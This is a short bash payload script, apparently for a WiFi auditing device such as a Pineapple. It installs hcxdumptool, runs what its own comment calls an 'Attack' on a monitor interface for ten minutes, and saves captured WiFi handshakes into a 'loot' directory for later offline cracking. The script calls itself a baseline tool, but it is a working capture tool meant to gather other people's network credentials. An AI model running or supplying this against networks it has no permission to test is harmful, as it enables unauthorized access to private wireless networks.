#!/bin/bash
# Title: Auto_HCX_Capture
#Made by: MusicalVR
#A tool for gathering a detailed baseline around you

#Checking for HCX
if ! command -v hcxdumptool &> /dev/null; then
    LOG "HCX missing. Starting install..."
    LED red solid
    opkg update
    opkg install hcxdumptool hcxtools
    LED finish
else
    LOG "HCX already installed. Skipping download."
fi


LOG "Starting HCX"
LOG "HCX STARTED"

INTERFACE="wlan1mon"
LOOT_DIR="/root/loot/handshakes"
mkdir -p $LOOT_DIR

# Start Signal (Blue)
VIBRATE "alert"
LED red solid B
LOG "Field Capture Started..."

# Launch Attack
FILE_NAME="$LOOT_DIR/capture_$(date +%s).pcapng"
hcxdumptool -i $INTERFACE -w "$FILE_NAME" &
HCX_PID=$!

# 10 Minute Monitor Loop
for i in {1..10}; do
    LED blue solid A
    sleep 30
    LED FINISH
    sleep 30
    LOG "Minute $i/10 complete."
done

# Success Signal (Green)
kill -2 $HCX_PID
VIBRATE "alert"
LED green solid
LED blue solid 
LOG "Capture Complete: $(basename $FILE_NAME)"
